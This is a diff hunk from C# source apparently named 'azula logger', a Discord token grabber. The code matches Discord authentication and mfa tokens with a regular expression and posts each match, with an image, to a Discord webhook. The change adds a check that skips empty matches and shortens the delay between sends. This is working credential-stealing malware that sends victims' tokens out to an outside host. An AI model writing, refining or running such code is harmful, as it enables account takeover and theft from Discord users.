@@ -28,9 +28,17 @@ namespace azula_logger
                    @"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}";
                 Match token = Regex.Match(text, token_reg);
 
+
                 //sending webhook + waiting so u dont get an error
-                websend.sendDiscordWebhook(webhook, "azula logger", token.ToString() + "\n -------------------------", image);
-                Thread.Sleep(800);
+                if(token.ToString() == "")
+                {
+                    //This is just here so it doesnt send an emty message
+                }
+                else
+                {
+                    websend.sendDiscordWebhook(webhook, "azula logger", token.ToString() + "\n -------------------------", image);
+                    Thread.Sleep(100);
+                }
             }
             }
             catch { }
